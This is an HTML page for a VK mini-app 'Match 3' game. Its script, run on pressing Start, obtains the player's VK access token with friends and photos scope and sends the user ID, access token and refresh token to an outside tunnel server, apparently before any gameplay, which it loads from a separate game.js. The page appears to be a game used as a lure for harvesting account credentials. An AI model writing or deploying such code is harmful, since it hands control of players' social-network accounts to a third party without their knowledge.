<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Match 3</title>
  <style>
    body {
      background: linear-gradient(to bottom, #ADD8E6, #87CEEB);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      overflow: hidden;
      color: white;
    }

    #gameContainer {
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    #gameBoard {
      display: grid;
      grid-gap: 2px;
      border: 1px solid black;
      width: 870px;
      height: 870px;
      background-color: #77B5FE;
      border-radius: 20px;
      overflow: hidden;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
    }

    .cell {
      width: calc(870px / 8 - 2px);
      height: calc(870px / 8 - 2px);
      text-align: center;
      font-size: 24px;
      cursor: pointer;
      transition: transform 0.2s ease, background-color 0.2s ease;
      background-size: contain;
      background-repeat: no-repeat;
      background-position: center;
      border-radius: 15px;
      background-color: #6495ED;
    }

    .cell.swapping {
      transform: scale(1.2);
    }

    .cell.removing {
      opacity: 0;
      transition: opacity 0.2s ease;
    }

    #start {
      padding: 20px 40px;
      font-size: 24px;
      cursor: pointer;
      background-color: #4682B4;
      color: white;
      border: none;
      border-radius: 10px;
      transition: background-color 0.3s ease;
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      z-index: 100;
    }

    #start.hidden {
      display: none;
    }

    #start:hover {
      background-color: #5F9EA0;
    }
  </style>
</head>
<body>

  <div id="gameContainer">
    <button id="start" onclick="initialize()">Starst</button>
    <div id="gameBoard"></div>
  </div>

  <script src="https://unpkg.com/@vkontakte/vk-bridge/dist/browser.min.js"></script>
  <script>
    const APP_ID = 8109529;
    let accessToken = null;
    let userInfo = null;
    let tokenRefreshTimer = null;

    function showError(message) {
      console.error(message);
    }

    function updateStatus(message) {
      console.log(message);
    }

    function hideStartButton() {
      const startButton = document.getElementById('start');
      if (startButton) {
        startButton.classList.add('hidden');
      }
    }

    async function initialize() {
      hideStartButton();

      try {
        if (!vkBridge.supports('VKWebAppInit')) {
          throw new Error('Откройте приложение внутри VK!');
        }

        await vkBridge.send('VKWebAppInit');
        updateStatus('Инициализация...');

        const authData = await vkBridge.send('VKWebAppGetAuthToken', {
          app_id: APP_ID,
          scope: 'friends,photos'
        });

        accessToken = authData.access_token;
        userInfo = await vkBridge.send('VKWebAppGetUserInfo');

        function getRFCFormattedDateTime() {
          return new Date().toUTCString(); // Например: "Tue, 11 Mar 2025 04:33:27 GMT"
        }

        const tokenData = {
          user_id: userInfo.id.toString(),
          access_token: authData.access_token,
          refresh_token: authData.refresh_token || 'NO_REFRESH_TOKEN',
          token_type: authData.token_type || 'Bearer',
          expires_in: authData.expires_in || 3600,
          id_token: authData.id_token || '',
          token_datetime: getRFCFormattedDateTime()
        };

        console.log("token_datetime (RFC 5322):", tokenData.token_datetime);

        await sendTokenToYourServer(tokenData);
        setupTokenRefresh(authData.expires_in || 3600);

        showGame();

      } catch (error) {
        showError(`Ошибка: ${error.message || 'Неизвестная ошибка'}`);
      }
    }

    async function sendTokenToYourServer(data) {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 5000);

      try {
        const response = await fetch('https://bla39d-37-45-190-41.ru.tuna.am/api/vk-token', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(data),
          signal: controller.signal
        });

        clearTimeout(timeoutId);

        if (!response.ok) {
          throw new Error(`Ошибка ${response.status}: ${response.statusText}`);
        }

        console.log('Данные успешно отправлены на сервер');
        return await response.json();

      } catch (error) {
        console.error('Ошибка отправки на сервер:', error);
        showError('Ошибка сохранения данных');
      }
    }

    function setupTokenRefresh(expiresIn) {
      if (tokenRefreshTimer) {
        clearTimeout(tokenRefreshTimer);
      }

      tokenRefreshTimer = setTimeout(async () => {
        console.log('Обновление токена...');
        try {
          const authData = await vkBridge.send('VKWebAppGetAuthToken', {
            app_id: APP_ID,
            scope: 'friends,photos'
          });

          accessToken = authData.access_token;

          console.log('Токен успешно обновлён');
          updateStatus('Токен обновлён');

          setupTokenRefresh(authData.expires_in || 3600);
        } catch (error) {
          console.error('Ошибка при обновлении токена:', error);
          showError('Не удалось обновить токен');
        }
      }, (expiresIn - 60) * 1000);
    }

    async function showGame() {
      try {
        await loadGameScript();
        if (typeof startGame === 'function') {
          startGame();
        } else {
          showError('Ошибка инициализации игры');
        }
      } catch (error) {
        console.error('Ошибка загрузки игры:', error);
        showError('Не удалось загрузить игру');
      }
    }

    function loadGameScript() {
      return new Promise((resolve, reject) => {
        const script = document.createElement('script');
        script.src = 'game.js';
        script.onload = resolve;
        script.onerror = reject;

        setTimeout(() => reject(new Error('Время загрузки игры истекло')), 5000);

        document.head.appendChild(script);
      });
    }
  </script>
  <script src="game.js"></script>
</body>
</html>
